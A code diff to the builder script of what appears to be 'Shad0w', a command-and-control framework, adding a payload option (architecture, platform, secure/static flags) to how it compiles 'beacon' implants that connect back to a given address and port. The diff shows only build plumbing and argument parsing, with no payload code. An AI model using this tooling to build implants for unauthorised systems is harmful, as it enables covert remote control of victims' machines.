@@ -67,17 +67,78 @@ class Shad0wBuilder(object):
         super(Shad0wBuilder, self).__init__()
 
         # key variables for the build
-        self.address  = args['address']
-        self.port     = args['port']
-        self.jitter   = args['jitter']
-        self.format   = args['format']
-        self.outfile  = args['out']
-        self.debugv   = args['debug']
+        self.address = args['address']
+        self.port    = args['port']
+        self.jitter  = args['jitter']
+        self.format  = args['format']
+        self.outfile = args['out']
+        self.debugv  = args['debug']
+        self.payload = args['payload']
 
         # get the debug/logging stuff ready
         self.debug   = debug.Debug(self.debugv)
+    
+    def raise_issue_payload(self, string):
+
+        # throw an error with the payload string
+        print(f"Invalid payload: '{string}'")
+
+        # exit with error code
+        exit(-1)
+    
+    def get_payload_variables(self, payload_string):
+        
+        # set our return args
+        arch     = None
+        platform = None
+        secure   = None
+        static   = None
+
+        # split up the payload string
+        payload = payload_string.split('/')
+
+        # these two are essential so die without them
+        try:
+            arch     = payload[0]
+            platform = payload[1]
+        except IndexError:
+            self.raise_issue_payload(payload_string)
+
+        # these two dont matter as much
+        try:
+            secure   = payload[2]
+            static   = payload[3]
+        except IndexError:
+            pass
+    
+        # make sure we get the correct args
+        try:
+            if static == "static":
+                static = static
+            if secure == "static":
+                static = secure
+                secure = None
+            if secure not in ["secure", None]:
+                self.raise_issue_payload(payload_string)
+        except NameError: pass
+        
+
+        # check we have correct arg names
+        try:
+            assert arch in ["x86", "x64"]
+            assert platform in ["windows", "linux", "osx"]
+        except AssertionError:
+            self.raise_issue_payload(payload_string)
+
+        print(arch, platform, secure, static)
+
+        # return our generated args
+        return arch, platform, secure, static
 
     def build(self):
+
+        # get the variables for the make
+        arch, platform, secure, static = self.get_payload_variables(self.payload)
 
         # copy source files into build directory
         buildtools.clone_source_files(asm=True)
@@ -86,7 +147,7 @@ class Shad0wBuilder(object):
         buildtools.update_settings_file(self)
 
         # now we need to run 'make' inside the cloned dir
-        buildtools.make_in_clone()
+        buildtools.make_in_clone(arch=arch, platform=platform, secure=secure, static=static)
 
         # now get the beacon in the correct format
         if self.format == "raw":
@@ -154,8 +215,9 @@ if __name__ == '__main__':
     # set the arguments for creating the beacon
     if mode == "beacon":
         beacon_parser = argparse.ArgumentParser(prog="beacon")
-        beacon_parser.add_argument("-a", "--address", required=True, help="Address the beacon will connect to")
-        beacon_parser.add_argument("-p", "--port", required=False, default=443, help="Port the beacon will connect on")
+        beacon_parser.add_argument("-p", "--payload", required=True, help="Beacon payload to use")
+        beacon_parser.add_argument("-H", "--address", required=True, help="Address the beacon will connect to")
+        beacon_parser.add_argument("-P", "--port", required=False, default=443, help="Port the beacon will connect on")
         beacon_parser.add_argument("-j", "--jitter", required=False, default=1, type=int, help="Jitter the beacon should use when connecting back")
         beacon_parser.add_argument("-f", "--format", required=True, choices=('raw', 'exe'), help="Format to drop the beacon in (raw or exe)")
         beacon_parser.add_argument("-o", "--out", required=True, help="File to store the beacon in")
